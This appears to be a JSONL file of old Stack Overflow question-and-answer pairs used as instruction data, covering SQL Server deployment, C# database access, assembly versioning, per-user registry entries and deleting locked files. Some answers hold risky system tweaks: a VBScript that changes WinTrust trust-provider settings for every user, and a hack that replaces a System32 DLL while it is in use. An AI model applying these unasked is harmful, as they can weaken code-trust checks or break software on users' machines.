{"instruction": "Are there any really good tutorials explaining branching and merging with Apache Subversion? \nAll the better if it's specific to TortoiseSVN client.", "output": "Version Control with Subversion\nA very good resource for source control in general. Not really TortoiseSVN specific, though."}
{"instruction": "I've written a database generation script in SQL and want to execute it in my Adobe AIR application:\nCreate Table tRole (\n      roleID integer Primary Key\n      ,roleName varchar(40)\n);\nCreate Table tFile (\n    fileID integer Primary Key\n    ,fileName varchar(50)\n    ,fileDescription varchar(500)\n    ,thumbnailID integer\n    ,fileFormatID integer\n    ,categoryID integer\n    ,isFavorite boolean\n    ,dateAdded date\n    ,globalAccessCount integer\n    ,lastAccessTime date\n    ,downloadComplete boolean\n    ,isNew boolean\n    ,isSpotlight boolean\n    ,duration varchar(30)\n);\nCreate Table tCategory (\n    categoryID integer Primary Key\n    ,categoryName varchar(50)\n    ,parent_categoryID integer\n);\n...\n\nI execute this in Adobe AIR using the following methods:\npublic static function RunSqlFromFile(fileName:String):void {\n    var file:File = File.applicationDirectory.resolvePath(fileName);\n    var stream:FileStream = new FileStream();\n    stream.open(file, FileMode.READ)\n    var strSql:String = stream.readUTFBytes(stream.bytesAvailable);\n    NonQuery(strSql);\n}\n\npublic static function NonQuery(strSQL:String):void\n{\n    var sqlConnection:SQLConnection = new SQLConnection();\n    sqlConnection.open(File.applicationStorageDirectory.resolvePath(DBPATH);\n    var sqlStatement:SQLStatement = new SQLStatement();\n    sqlStatement.text = strSQL;\n    sqlStatement.sqlConnection = sqlConnection;\n    try\n    {\n        sqlStatement.execute();\n    }\n    catch (error:SQLError)\n    {\n        Alert.show(error.toString());\n    }\n}\n\nNo errors are generated, however only tRole exists. It seems that it only looks at the first query (up to the semicolon- if I remove it, the query fails). Is there a way to call multiple queries in one statement?", "output": "I wound up using this. It is a kind of a hack, but it actually works pretty well. The only thing is you have to be very careful with your semicolons. : D\nvar strSql:String = stream.readUTFBytes(stream.bytesAvailable);      \nvar i:Number = 0;\nvar strSqlSplit:Array = strSql.split(\";\");\nfor (i = 0; i < strSqlSplit.length; i++){\n    NonQuery(strSqlSplit[i].toString());\n}"}
{"instruction": "This is something I've pseudo-solved many times and never quite found a solution. That's stuck with me. The problem is to come up with a way to generate N colors, that are as distinguishable as possible where N is a parameter.", "output": "I've read somewhere the human eye can't distinguish between less than 4 values apart. so This is something to keep in mind. The following algorithm does not compensate for this.\nI'm not sure this is exactly what you want, but this is one way to randomly generate non-repeating color values:\n(beware, inconsistent pseudo-code ahead)\n//colors entered as 0-255 [R, G, B]colors = []; //holds final colors to be usedrand = new Random();//assumes n is less than 16,777,216randomGen(int n){   while (len(colors) < n){      //generate a random number between 0,255 for each color      newRed = rand.next(256);      newGreen = rand.next(256);      newBlue = rand.next(256);      temp = [newRed, newGreen, newBlue];      //only adds new colors to the array      if temp not in colors {         colors.append(temp);      }   }}\nOne way you could optimize this for better visibility would be to compare the distance between each new color and all the colors in the array:\nfor item in color{   itemSq = (item[0]^2 + item[1]^2 + item[2]^2])^(.5);   tempSq = (temp[0]^2 + temp[1]^2 + temp[2]^2])^(.5);   dist = itemSq - tempSq;   dist = abs(dist);}//NUMBER can be your chosen distance apart.if dist < NUMBER and temp not in colors {   colors.append(temp);}\nBut this approach would significantly slow down your algorithm.\nAnother way would be to scrap the randomness and systematically go through every 4 values and add a color to an array in the above example."}
{"instruction": "I have a little game written in C#. It uses a database as back-end. It's \na trading card game, and I wanted to implement the function of the cards as a script.\nWhat I mean is that I essentially have an interface, ICard, which a card class implements (public class Card056 : ICard) and which contains function that are called by the game.\nNow, to make the thing maintainable/moddable, I would like to have the class for each card as source code in the database and essentially compile it on first use. So when I have to add/change a card, I'll just add it to the database and tell my application to refresh, without needing any assembly deployment (especially since we would be talking about 1 assembly per card which means hundreds of assemblies).\nIs that possible? Register a class from a source file and then instantiate it, etc.\nICard Cards[current] = new MyGame.CardLibrary.Card056();\nCards[current].OnEnterPlay(ref currentGameState);\n\nThe language is C#, but extra bonus if it's possible to write the script in any .NET language.", "output": "Yes, I thought about that, but I soon figured out that another Domain-Specific-Language (DSL) would be a bit too much.\nEssentially, they need to interact with my gamestate in possibly unpredictable ways. For example, a card could have a rule \"When this cards enter play, all your undead minions gain +3 attack against flying enemies, except when the enemy is blessed\". As trading card games are turn based, the GameState Manager will fire OnStageX events and let the cards modify other cards or the GameState in whatever way the card needs.\nIf I try to create a DSL, I have to implement a rather large feature set and possibly constantly update it, which shifts the maintenance work to another part without actually removing it.\nThat's why I wanted to stay with a \"real\" .NET language to essentially be able to just fire the event and let the card manipulate the gamestate in whatever way (within the limits of the code access security)."}
{"instruction": "I have a little game written in C#. It uses a database as back-end. It's \na trading card game, and I wanted to implement the function of the cards as a script.\nWhat I mean is that I essentially have an interface, ICard, which a card class implements (public class Card056 : ICard) and which contains function that are called by the game.\nNow, to make the thing maintainable/moddable, I would like to have the class for each card as source code in the database and essentially compile it on first use. So when I have to add/change a card, I'll just add it to the database and tell my application to refresh, without needing any assembly deployment (especially since we would be talking about 1 assembly per card which means hundreds of assemblies).\nIs that possible? Register a class from a source file and then instantiate it, etc.\nICard Cards[current] = new MyGame.CardLibrary.Card056();\nCards[current].OnEnterPlay(ref currentGameState);\n\nThe language is C#, but extra bonus if it's possible to write the script in any .NET language.", "output": "Oleg Shilo's C# Script solution (at The Code Project) really is a great introduction to providing script abilities in your application.\nA different approach would be to consider a language that is specifically built for scripting, such as IronRuby, IronPython, or Lua.\nIronPython and IronRuby are both available today.\nFor a guide to embedding IronPython read\nHow to embed IronPython script support in your existing app in 10 easy steps.\nLua is a scripting language commonly used in games. There is a Lua compiler for .NET, available from CodePlex -- http://www.codeplex.com/Nua\nThat codebase is a great read if you want to learn about building a compiler in .NET.\nA different angle altogether is to try PowerShell. There are numerous examples of embedding PowerShell into an application -- here's a thorough project on the topic: \nPowershell Tunnel"}
{"instruction": "I am working on a collection of classes used for video playback and recording. I have one main class which acts like the public interface, with methods like play(), stop(), pause(), record() etc... Then I have workhorse classes which do the video decoding and video encoding. \nI just learned about the existence of nested classes in C++, and I'm curious to know what programmers think about using them. I am a little wary and not really sure what the benefits/drawbacks are, but they seem (according to the book I'm reading) to be used in cases such as mine.\nThe book suggests that in a scenario like mine, a good solution would be to nest the workhorse classes inside the interface class, so there are no separate files for classes the client is not meant to use, and to avoid any possible naming conflicts? I don't know about these justifications. Nested classes are a new concept to me. Just want to see what programmers think about the issue.", "output": "I would be a bit reluctant to use nested classes here.  What if you created an abstract base class for a \"multimedia driver\" to handle the back-end stuff (workhorse), and a separate class for the front-end work?  The front-end class could take a pointer/reference to an implemented driver class (for the appropriate media type and situation) and perform the abstract operations on the workhorse structure.\nMy philosophy would be to go ahead and make both structures accessible to the client in a polished way, just under the assumption they would be used in tandem.\nI would reference something like a QTextDocument in Qt.  You provide a direct interface to the bare metal data handling, but pass the authority along to an object like a QTextEdit to do the manipulation."}
{"instruction": "I have a little game written in C#. It uses a database as back-end. It's \na trading card game, and I wanted to implement the function of the cards as a script.\nWhat I mean is that I essentially have an interface, ICard, which a card class implements (public class Card056 : ICard) and which contains function that are called by the game.\nNow, to make the thing maintainable/moddable, I would like to have the class for each card as source code in the database and essentially compile it on first use. So when I have to add/change a card, I'll just add it to the database and tell my application to refresh, without needing any assembly deployment (especially since we would be talking about 1 assembly per card which means hundreds of assemblies).\nIs that possible? Register a class from a source file and then instantiate it, etc.\nICard Cards[current] = new MyGame.CardLibrary.Card056();\nCards[current].OnEnterPlay(ref currentGameState);\n\nThe language is C#, but extra bonus if it's possible to write the script in any .NET language.", "output": "You might be able to use IronRuby for that. \nOtherwise I'd suggest you have a directory where you place precompiled assemblies. Then you could have a reference in the DB to the assembly and class, and use reflection to load the proper assemblies at runtime.\nIf you really want to compile at run-time you could use the CodeDOM, then you could use reflection to load the dynamic assembly. MSDN article which might help."}
{"instruction": "I have a little game written in C#. It uses a database as back-end. It's \na trading card game, and I wanted to implement the function of the cards as a script.\nWhat I mean is that I essentially have an interface, ICard, which a card class implements (public class Card056 : ICard) and which contains function that are called by the game.\nNow, to make the thing maintainable/moddable, I would like to have the class for each card as source code in the database and essentially compile it on first use. So when I have to add/change a card, I'll just add it to the database and tell my application to refresh, without needing any assembly deployment (especially since we would be talking about 1 assembly per card which means hundreds of assemblies).\nIs that possible? Register a class from a source file and then instantiate it, etc.\nICard Cards[current] = new MyGame.CardLibrary.Card056();\nCards[current].OnEnterPlay(ref currentGameState);\n\nThe language is C#, but extra bonus if it's possible to write the script in any .NET language.", "output": "You could use any of the DLR languages, which provide a way to really easily host your own scripting platform. However, you don't have to use a scripting language for this. You could use C# and compile it with the C# code provider. As long as you load it in its own AppDomain, you can load and unload it to your heart's content."}
{"instruction": "I've been writing a few web services for a .net app, now I'm ready to consume them. I've seen numerous examples where there is homegrown code for consuming the service as opposed to using the auto generated methods Visual Studio creates when adding the web reference. \nIs there some advantage to this?", "output": "No, what you're doing is fine. Don't let those people confuse you.\nIf you've written the web services with .net then the reference proxies generated by .net are going to be quite suitable. The situation you describe (where you are both producer and consumer) is the ideal situation.\nIf you need to connect to a web services that is unknown at compile time, then you would want a more dynamic approach, where you deduce the 'shape' of the web service. \nBut start by using the auto generated proxy class, and don't worry about it until you hit a limitation. And when you do -- come back to stack overflow ;-)"}
{"instruction": "This is something I've pseudo-solved many times and never quite found a solution. That's stuck with me. The problem is to come up with a way to generate N colors, that are as distinguishable as possible where N is a parameter.", "output": "Isn't it also a factor which order you set up the colors?\nLike if you use Dillie-Os idea you need to mix the colors as much as possible. \r\n0 64 128 256 is from one to the next. but 0 256 64 128 in a wheel would be more \"apart\"\nDoes this make sense?"}
{"instruction": "This is something I've pseudo-solved many times and never quite found a solution. That's stuck with me. The problem is to come up with a way to generate N colors, that are as distinguishable as possible where N is a parameter.", "output": "My first thought on this is \"how generate N vectors in a space that maximize distance from each other.\" You can see that the RGB (or any other scale you use that forms a basis in color space) are just vectors. Take a look at Random Point Picking. Hope this is a good start for you! Once you have a set of vectors that are maximized a part, you can save them in a hash table or something for later, and just perform random rotations on them to get all the colors you desire that are maximally apart from each other!\nEdit: Thinking about this problem more, it would be better to map the colors in a linear manor, possibly (0,0,0) --> (255,255,255) lexicographically, and then distribute them evenly. I really don't know how well this will work, but it should since, lets say:\nn = 10\nwe know we have 16777216 colors (256^3). We can use buckles algorithm 515 to find the lexicographically indexed color.. You'll probably have to edit the algorithm to avoid overflow and probably add some minor speed improvements."}
{"instruction": "I wonder how you guys manage deployment of a database between 2 SQL Servers, specifically SQL Server 2005.\nNow, there is a development and a live one. As this should be part of a buildscript (standard windows batch, even do with current complexity of those scripts, i might switch to PowerShell or so later), Enterprise Manager/Management Studio Express do not count.\nWould you just copy the .mdf File and attach it? I am always a bit careful when working with binary data, as this seems to be a compatiblity issue (even though development and live should run the same version of the server at all time).\nOr - given the lack of \"EXPLAIN CREATE TABLE\" in T-SQL - do you do something that exports an existing database into SQL-Scripts which you can run on the target server? If yes, is there a tool that can automatically dump a given Database into SQL Queries and that runs off the command line? (Again, Enterprise Manager/Management Studio Express do not count).\nAnd lastly - given the fact that the live database already contains data, the deployment may not involve creating all tables but rather checking the difference in structure and ALTER TABLE the live ones instead, which may also need data verification/conversion when existing fields change.\nNow, i hear a lot of great stuff about the Red Gate products, but for hobby projects, the price is a bit steep.\nSo, what are you using to automatically deploy SQL Server Databases from Test to Live?", "output": "For my projects I alternate between SQL Compare from REd Gate and the Database Publishing Wizard from Microsoft which you can download free\r\nhere.\nThe Wizard isn't as slick as SQL Compare or SQL Data Compare but it does the trick. One issue is that the scripts it generates may need some rearranging and/or editing to flow in one shot.\nOn the up side, it can move your schema and data which isn't bad for a free tool."}
{"instruction": "I wonder how you guys manage deployment of a database between 2 SQL Servers, specifically SQL Server 2005.\nNow, there is a development and a live one. As this should be part of a buildscript (standard windows batch, even do with current complexity of those scripts, i might switch to PowerShell or so later), Enterprise Manager/Management Studio Express do not count.\nWould you just copy the .mdf File and attach it? I am always a bit careful when working with binary data, as this seems to be a compatiblity issue (even though development and live should run the same version of the server at all time).\nOr - given the lack of \"EXPLAIN CREATE TABLE\" in T-SQL - do you do something that exports an existing database into SQL-Scripts which you can run on the target server? If yes, is there a tool that can automatically dump a given Database into SQL Queries and that runs off the command line? (Again, Enterprise Manager/Management Studio Express do not count).\nAnd lastly - given the fact that the live database already contains data, the deployment may not involve creating all tables but rather checking the difference in structure and ALTER TABLE the live ones instead, which may also need data verification/conversion when existing fields change.\nNow, i hear a lot of great stuff about the Red Gate products, but for hobby projects, the price is a bit steep.\nSo, what are you using to automatically deploy SQL Server Databases from Test to Live?", "output": "I've taken to hand-coding all of my DDL (creates/alter/delete) statements, adding them to my .sln as text files, and using normal versioning (using subversion, but any revision control should work). This way, I not only get the benefit of versioning, but updating live from dev/stage is the same process for code and database - tags, branches and so on work all the same.\nOtherwise, I agree redgate is expensive if you don't have a company buying it for you. If you can get a company to buy it for you though, it really is worth it!"}
{"instruction": "I wonder how you guys manage deployment of a database between 2 SQL Servers, specifically SQL Server 2005.\nNow, there is a development and a live one. As this should be part of a buildscript (standard windows batch, even do with current complexity of those scripts, i might switch to PowerShell or so later), Enterprise Manager/Management Studio Express do not count.\nWould you just copy the .mdf File and attach it? I am always a bit careful when working with binary data, as this seems to be a compatiblity issue (even though development and live should run the same version of the server at all time).\nOr - given the lack of \"EXPLAIN CREATE TABLE\" in T-SQL - do you do something that exports an existing database into SQL-Scripts which you can run on the target server? If yes, is there a tool that can automatically dump a given Database into SQL Queries and that runs off the command line? (Again, Enterprise Manager/Management Studio Express do not count).\nAnd lastly - given the fact that the live database already contains data, the deployment may not involve creating all tables but rather checking the difference in structure and ALTER TABLE the live ones instead, which may also need data verification/conversion when existing fields change.\nNow, i hear a lot of great stuff about the Red Gate products, but for hobby projects, the price is a bit steep.\nSo, what are you using to automatically deploy SQL Server Databases from Test to Live?", "output": "If you have a company buying it, Toad from Quest Software has this kind of management functionality built in.  It's basically a two-click operation to compare two schemas and generate a sync script from one to the other.\nThey have editions for most of the popular databases, including of course Sql Server."}
{"instruction": "I wonder how you guys manage deployment of a database between 2 SQL Servers, specifically SQL Server 2005.\nNow, there is a development and a live one. As this should be part of a buildscript (standard windows batch, even do with current complexity of those scripts, i might switch to PowerShell or so later), Enterprise Manager/Management Studio Express do not count.\nWould you just copy the .mdf File and attach it? I am always a bit careful when working with binary data, as this seems to be a compatiblity issue (even though development and live should run the same version of the server at all time).\nOr - given the lack of \"EXPLAIN CREATE TABLE\" in T-SQL - do you do something that exports an existing database into SQL-Scripts which you can run on the target server? If yes, is there a tool that can automatically dump a given Database into SQL Queries and that runs off the command line? (Again, Enterprise Manager/Management Studio Express do not count).\nAnd lastly - given the fact that the live database already contains data, the deployment may not involve creating all tables but rather checking the difference in structure and ALTER TABLE the live ones instead, which may also need data verification/conversion when existing fields change.\nNow, i hear a lot of great stuff about the Red Gate products, but for hobby projects, the price is a bit steep.\nSo, what are you using to automatically deploy SQL Server Databases from Test to Live?", "output": "I work the same way Karl does, by keeping all of my SQL scripts for creating and altering tables in a text file that I keep in source control.  In fact, to avoid the problem of having to have a script examine the live database to determine what ALTERs to run, I usually work like this:\n\nOn the first version, I place everything during testing into one SQL script, and treat all tables as a CREATE.  This means I end up dropping and readding tables a lot during testing, but that's not a big deal early into the project (since I'm usually hacking the data I'm using at that point anyway).\nOn all subsequent versions, I do two things: I make a new text file to hold the upgrade SQL scripts, that contain just the ALTERs for that version.  And I make the changes to the original, create a fresh database script as well.  This way an upgrade just runs the upgrade script, but if we have to recreate the DB we don't need to run 100 scripts to get there.\nDepending on how I'm deploying the DB changes, I'll also usually put a version table in the DB that holds the version of the DB.  Then, rather than make any human decisions about which scripts to run, whatever code I have running the create/upgrade scripts uses the version to determine what to run.\n\nThe one thing this will not do is help if part of what you're moving from test to production is data, but if you want to manage structure and not pay for a nice, but expensive DB management package, is really not very difficult.  I've also found it's a pretty good way of keeping mental track of your DB."}
{"instruction": "I wonder how you guys manage deployment of a database between 2 SQL Servers, specifically SQL Server 2005.\nNow, there is a development and a live one. As this should be part of a buildscript (standard windows batch, even do with current complexity of those scripts, i might switch to PowerShell or so later), Enterprise Manager/Management Studio Express do not count.\nWould you just copy the .mdf File and attach it? I am always a bit careful when working with binary data, as this seems to be a compatiblity issue (even though development and live should run the same version of the server at all time).\nOr - given the lack of \"EXPLAIN CREATE TABLE\" in T-SQL - do you do something that exports an existing database into SQL-Scripts which you can run on the target server? If yes, is there a tool that can automatically dump a given Database into SQL Queries and that runs off the command line? (Again, Enterprise Manager/Management Studio Express do not count).\nAnd lastly - given the fact that the live database already contains data, the deployment may not involve creating all tables but rather checking the difference in structure and ALTER TABLE the live ones instead, which may also need data verification/conversion when existing fields change.\nNow, i hear a lot of great stuff about the Red Gate products, but for hobby projects, the price is a bit steep.\nSo, what are you using to automatically deploy SQL Server Databases from Test to Live?", "output": "I agree that scripting everything is the best way to go and is what I advocate at work.  You should script everything from DB and object creation to populating your lookup tables.\nAnything you do in UI only won't translate (especially for changes... not so much for first deployments) and will end up requiring a tools like what Redgate offers."}
{"instruction": "I would like the version property of my application to be incremented for each build but I'm not sure on how to enable this functionality in Visual Studio (2005/2008). I have tried to specify the AssemblyVersion as 1.0.* but it doesn't get me exactly what I want. \nI'm also using a settings file and in earlier attempts when the assembly version changed my settings got reset to the default since the application looked for the settings file in another directory. \nI would like to be able to display a version number in the form of 1.1.38 so when a user finds a problem I can log the version they are using as well as tell them to upgrade if they have an old release.\nA short explanation of how the versioning works would also be appreciated. When does the build and revision number get incremented?", "output": "With the \"Built in\" stuff, you can't, as using 1.0.* or 1.0.0.* will replace the revision and build numbers with a coded date/timestamp, which is usually also a good way. \nFor more info, see the Assembly Linker Documentation in the /v tag.\nAs for automatically incrementing numbers, use the AssemblyInfo Task:\nAssemblyInfo Task\nThis can be configured to automatically increment the build number.\nThere are 2 Gotchas:\n\nEach of the 4 numbers in the Version string is limited to 65535. This is a Windows Limitation and unlikely to get fixed.\n\nWhy are build numbers limited to 65535?\n\nUsing with with Subversion requires a small change:\n\nUsing MSBuild to generate assembly version info at build time (including SubVersion fix)\n\n\nRetrieving the Version number is then quite easy:\nVersion v = Assembly.GetExecutingAssembly().GetName().Version;\nstring About = string.Format(CultureInfo.InvariantCulture, @\"YourApp Version {0}.{1}.{2} (r{3})\", v.Major, v.Minor, v.Build, v.Revision);\n\n\nAnd, to clarify: In .net or at least in C#, the build is actually the THIRD number, not the fourth one as some people (for example Delphi Developers who are used to Major.Minor.Release.Build) might expect.\nIn .net, it's Major.Minor.Build.Revision."}
{"instruction": "I would like the version property of my application to be incremented for each build but I'm not sure on how to enable this functionality in Visual Studio (2005/2008). I have tried to specify the AssemblyVersion as 1.0.* but it doesn't get me exactly what I want. \nI'm also using a settings file and in earlier attempts when the assembly version changed my settings got reset to the default since the application looked for the settings file in another directory. \nI would like to be able to display a version number in the form of 1.1.38 so when a user finds a problem I can log the version they are using as well as tell them to upgrade if they have an old release.\nA short explanation of how the versioning works would also be appreciated. When does the build and revision number get incremented?", "output": "What source control system are you using? \nAlmost all of them have some form of $ Id $ tag that gets expanded when the file is checked in.\nI usually use some form of hackery to display this as the version number.\nThe other alternative is use to use the date as the build number: 080803-1448"}
{"instruction": "I'm trying to maintain a Setup Project in Visual Studio 2003 (yes, it's a legacy application). The problem we have at the moment is that we need to write registry entries to HKCU for every user on the computer. They need to be in the HKCU rather than HKLM because they are the default user settings, and they do change per user. My feeling is that\n\nThis isn't possible\nThis isn't something the installer should be doing, but something the application should be doing (after all what happens when a user profile is created after the install?).\n\nWith that in mind, I still want to change as little as possible in the application, so my question is, is it possible to add registry entries for every user in a Visual Studio 2003 setup project? \nAnd, at the moment the project lists five registry root keys (HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, and User/Machine Hive). I don't really know anything about the Users root key, and haven't seen User/Machine Hive. Can anyone enlighten me on what they are? Perhaps they could solve my problem above.", "output": "I'm partway to my solution with this entry on MSDN (don't know how I couldn't find it before).\nUser/Machine Hive\nSubkeys and values entered under this hive will be installed under the HKEY_CURRENT_USER hive when a user chooses \"Just Me\" or the HKEY_USERS hive or when a user chooses \"Everyone\" during installation.\nRegistry Editor"}
{"instruction": "I'm trying to maintain a Setup Project in Visual Studio 2003 (yes, it's a legacy application). The problem we have at the moment is that we need to write registry entries to HKCU for every user on the computer. They need to be in the HKCU rather than HKLM because they are the default user settings, and they do change per user. My feeling is that\n\nThis isn't possible\nThis isn't something the installer should be doing, but something the application should be doing (after all what happens when a user profile is created after the install?).\n\nWith that in mind, I still want to change as little as possible in the application, so my question is, is it possible to add registry entries for every user in a Visual Studio 2003 setup project? \nAnd, at the moment the project lists five registry root keys (HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, and User/Machine Hive). I don't really know anything about the Users root key, and haven't seen User/Machine Hive. Can anyone enlighten me on what they are? Perhaps they could solve my problem above.", "output": "First: Yes, this is something that belongs in the Application for the exact reson you specified: What happens after new user profiles are created? Sure, if you're using a domain it's possible to have some stuff put in the registry on creation, but this is not really a use case. The Application should check if there are seetings and use the default settings if not.\nThat being said, it IS possible to change other users Keys through the HKEY_USERS Hive.\nI have no experience with the Visual Studio 2003 Setup Project, so here is a bit of (totally unrelated) VBScript code that might just give you an idea where to look:\nconst HKEY_USERS = &H80000003strComputer = \".\"Set objReg=GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\\" & strComputer & \"\\root\\default:StdRegProv\")strKeyPath = \"\"objReg.EnumKey HKEY_USERS, strKeyPath, arrSubKeysstrKeyPath = \"\\Software\\Microsoft\\Windows\\CurrentVersion\\WinTrust\\Trust Providers\\Software Publishing\"For Each subkey In arrSubKeys    objReg.SetDWORDValue HKEY_USERS, subkey & strKeyPath, \"State\", 146944Next\n(Code Courtesy of Jeroen Ritmeijer)"}
{"instruction": "I'm trying to maintain a Setup Project in Visual Studio 2003 (yes, it's a legacy application). The problem we have at the moment is that we need to write registry entries to HKCU for every user on the computer. They need to be in the HKCU rather than HKLM because they are the default user settings, and they do change per user. My feeling is that\n\nThis isn't possible\nThis isn't something the installer should be doing, but something the application should be doing (after all what happens when a user profile is created after the install?).\n\nWith that in mind, I still want to change as little as possible in the application, so my question is, is it possible to add registry entries for every user in a Visual Studio 2003 setup project? \nAnd, at the moment the project lists five registry root keys (HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, and User/Machine Hive). I don't really know anything about the Users root key, and haven't seen User/Machine Hive. Can anyone enlighten me on what they are? Perhaps they could solve my problem above.", "output": "I'm guessing that because you want to set it for all users, that you're on some kind of shared computer, which is probably running under a domain?\nHERE BE DRAGONS\nLet's say Joe and Jane regularly log onto the computer, then they will each have 'registries'.\nYou'll then install your app, and the installer will employ giant hacks and disgusting things to set items under HKCU for them.\nTHEN, bob will come along and log on (he, and 500 other people have accounts in the domain and so can do this). He's never used this computer before, so he has no registry. The first time he logs in, windows creates him one, but he won't have your setting. \nYour app then falls over or behaves incorrectly, and bob complains loudly about those crappy products from raynixon incorporated.\nThe correct answer is to just have some default settings in your app, which can write them to the registry if it doesn't find them. It's general good practice that your app should never depend on the registry, and should create things as needed, for any registry entry, not just HKCU, anyway"}
{"instruction": "I'm trying to maintain a Setup Project in Visual Studio 2003 (yes, it's a legacy application). The problem we have at the moment is that we need to write registry entries to HKCU for every user on the computer. They need to be in the HKCU rather than HKLM because they are the default user settings, and they do change per user. My feeling is that\n\nThis isn't possible\nThis isn't something the installer should be doing, but something the application should be doing (after all what happens when a user profile is created after the install?).\n\nWith that in mind, I still want to change as little as possible in the application, so my question is, is it possible to add registry entries for every user in a Visual Studio 2003 setup project? \nAnd, at the moment the project lists five registry root keys (HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, and User/Machine Hive). I don't really know anything about the Users root key, and haven't seen User/Machine Hive. Can anyone enlighten me on what they are? Perhaps they could solve my problem above.", "output": "Despite what the MSDN article  says about User/Machine Hive, it doesn't write to HKEY_USERS. Rather it writes to HKCU if you select Just Me and HKLM if you select Everyone.\nSo my solution is going to be to use the User/Machine Hive, and then in the application it checks if the registry entries are in HKCU and if not, copies them from HKLM. I know this probably isn't the most ideal way of doing it, but it has the least amount of changes."}
{"instruction": "What's the simplest way to connect and query a database for a set of records in C#?", "output": "Very roughly and from memory since I don't have code on this laptop:\nusing (OleDBConnection conn = new OleDbConnection())\n{\n  conn.ConnectionString = \"Whatever connection string\";\n\n  using (OleDbCommand cmd = new OleDbCommand())\n  {\n    cmd.Connection = conn;\n    cmd.CommandText = \"Select * from CoolTable\";\n\n    using (OleDbDataReader dr = cmd.ExecuteReader())\n    {\n      while (dr.Read())\n      {\n        // do something like Console.WriteLine(dr[\"column name\"] as String);\n      }\n    }\n  }\n}"}
{"instruction": "What's the simplest way to connect and query a database for a set of records in C#?", "output": "@Goyuix -- that's excellent for something written from memory.\ntested it here -- found the connection wasn't opened. Otherwise very nice.\nusing System.Data.OleDb;\n...\n\nusing (OleDbConnection conn = new OleDbConnection())\n{\n    conn.ConnectionString = \"Provider=sqloledb;Data Source=yourServername\\\\yourInstance;Initial Catalog=databaseName;Integrated Security=SSPI;\";\n\n    using (OleDbCommand cmd = new OleDbCommand())\n    {\n        conn.Open();\n        cmd.Connection = conn;\n        cmd.CommandText = \"Select * from yourTable\";\n\n        using (OleDbDataReader dr = cmd.ExecuteReader())\n        {\n            while (dr.Read())\n            {\n                Console.WriteLine(dr[\"columnName\"]);\n            }\n        }\n    }\n}"}
{"instruction": "What's the simplest way to connect and query a database for a set of records in C#?", "output": "That's definitely a good way to do it.  But you if you happen to be using a database that supports LINQ to SQL, it can be a lot more fun.  It can look something like this:\nMyDB db = new MyDB(\"Data Source=...\");var q = from db.MyTable        select c;foreach (var c in q)  Console.WriteLine(c.MyField.ToString());"}
{"instruction": "I'm looking for a way to delete a file which is locked by another process using C#. I suspect the method must be able to find which process is locking the file (perhaps by tracking the handles, although I'm not sure how to do this in C#) then close that process before being able to complete the file delete using File.Delete().", "output": "You can use this program, Handle, to find which process has the lock on your file. It's a command-line tool, so I guess you use the output from that... I'm not sure about finding it programmatically.\nIf deleting the file can wait, you could specify it for deletion when your computer next starts up:\n\nStart REGEDT32 (W2K) or REGEDIT (WXP) and navigate to:\nHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\n\nW2K and WXP\n\nW2K:EditAdd Value...Data Type: REG_MULTI_SZValue Name: PendingFileRenameOperationsOK\nWXP:EditNewMulti-String Valueenter\nPendingFileRenameOperations\n\nIn the Data area, enter \"\\??\\\" + filename to be deleted. LFNs may\nbe entered without being embedded in quotes. To delete C:\\Long Directory Name\\Long File Name.exe, enter the following data:\n\\??\\C:\\Long Directory Name\\Long File Name.exe\n\nThen press OK.\nThe \"destination file name\" is a null (zero) string. It is entered\nas follows:\n\nW2K:EditBinaryselect Data Format: Hexclick at the end of the hex stringenter 0000 (four zeros)OK\nWXP:Right-click the valuechoose \"Modify Binary Data\"click at the end of the hex stringenter 0000 (four zeros)OK\n\nClose REGEDT32/REGEDIT and reboot to delete the file.\n\n(Shamelessly stolen from some random forum, for posterity's sake.)"}
{"instruction": "I'm looking for a way to delete a file which is locked by another process using C#. I suspect the method must be able to find which process is locking the file (perhaps by tracking the handles, although I'm not sure how to do this in C#) then close that process before being able to complete the file delete using File.Delete().", "output": "Killing other processes is not a healthy thing to do. If your scenario involves something like uninstallation, you could use the MoveFileEx API function to mark the file for deletion upon next reboot.\nIf it appears that you really need to delete a file in use by another process, I'd recommend re-considering the actual problem before considering any solutions."}
{"instruction": "I'm looking for a way to delete a file which is locked by another process using C#. I suspect the method must be able to find which process is locking the file (perhaps by tracking the handles, although I'm not sure how to do this in C#) then close that process before being able to complete the file delete using File.Delete().", "output": "If you want to do it programatically. I'm not sure... and I'd really recommend against it.\r\nIf you're just troubleshooting stuff on your own machine, SysInternals Process Explorer can help you\nRun it, use the Find Handle command (I think it's either in the find or handle menu), and search for the name of your file. Once the handle(s) is found, you can forcibly close them.\nYou can then delete the file and so on.\nBeware, doing this may cause the program which owns the handles to behave strangely, as you've just pulled the proverbial rug out from under it, but it works well when you are debugging your own errant code, or when visual studio / windows explorer is being crap and not releasing file handles even though you told them to close the file ages ago... sigh :-)"}
{"instruction": "I'm looking for a way to delete a file which is locked by another process using C#. I suspect the method must be able to find which process is locking the file (perhaps by tracking the handles, although I'm not sure how to do this in C#) then close that process before being able to complete the file delete using File.Delete().", "output": "Oh, one big hack I employed years ago, is that Windows won't let you delete files, but it does let you move them.\nPseudo-sort-of-code:\nmv %WINDIR%\\System32\\mfc42.dll %WINDIR\\System32\\mfc42.dll.old\nInstall new mfc42.dll\nTell user to save work and restart applications\n\nWhen the applications restarted (note we didn't need to reboot the machine), they loaded the new mfc42.dll, and all was well. That, coupled with PendingFileOperations to delete the old one the next time the whole system restarted, worked pretty well."}
